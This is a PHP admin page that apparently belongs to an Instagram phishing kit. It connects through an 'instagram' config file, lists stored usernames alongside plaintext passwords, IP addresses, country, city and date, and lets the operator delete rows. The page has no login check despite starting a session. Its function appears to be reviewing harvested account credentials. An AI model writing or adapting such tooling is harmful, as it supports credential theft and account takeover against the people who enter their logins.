<?php
// Start the session
session_start();

// Database connection
require_once "../instagram/connect.php";

// Handle deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_id'])) {
    $delete_id = intval($_POST['delete_id']);
    $delete_sql = "DELETE FROM gm WHERE id = ?";
    $stmt = $conn->prepare($delete_sql);
    $stmt->bind_param("i", $delete_id);
    if ($stmt->execute()) {
        echo "<p style='color:green;'>Row with ID $delete_id deleted successfully.</p>";
    } else {
        echo "<p style='color:red;'>Failed to delete row with ID $delete_id.</p>";
    }
    $stmt->close();
}

// Display user data
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - User List</title>
</head>
<body>
<table cellpadding=8 border=2>
    <thead>
    <tr>
        <th>Id</th>
        <th>Username</th>
        <th>Password</th>
        <th>IP</th>
        <th>Country</th>
        <th>City</th>
        <th>Date</th>
        <th>Action</th>
    </tr>
    </thead>
    <tbody>
    <?php
    $sql = "SELECT * FROM gm";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $id = $row['id'];
            $username = $row['username'];
            $password = $row['password'];
            $ip = $row['ip'];
            $country = $row['country'];
            $city = $row['city'];
            $date = $row['date'];
            ?>
            <tr>
                <td><?php echo htmlspecialchars($id); ?></td>
                <td><?php echo htmlspecialchars($username); ?></td>
                <td><?php echo htmlspecialchars($password); ?></td>
                <td><?php echo htmlspecialchars($ip); ?></td>
                <td><?php echo htmlspecialchars($country); ?></td>
                <td><?php echo htmlspecialchars($city); ?></td>
                <td><?php echo htmlspecialchars($date); ?></td>
                <td>
                    <form method="post">
                        <input type="hidden" name="delete_id" value="<?php echo htmlspecialchars($id); ?>">
                        <button type="submit" style="background-color:red; color:white;border:none; cursor:pointer;">Delete</button>
                    </form>
                </td>
            </tr>
            <?php
        }
    } else {
        echo "<tr><td colspan=8><center>No data found or connection issue.</center></td></tr>";
    }

    $conn->close();
    ?>
    </tbody>
</table>
</body>
</html>
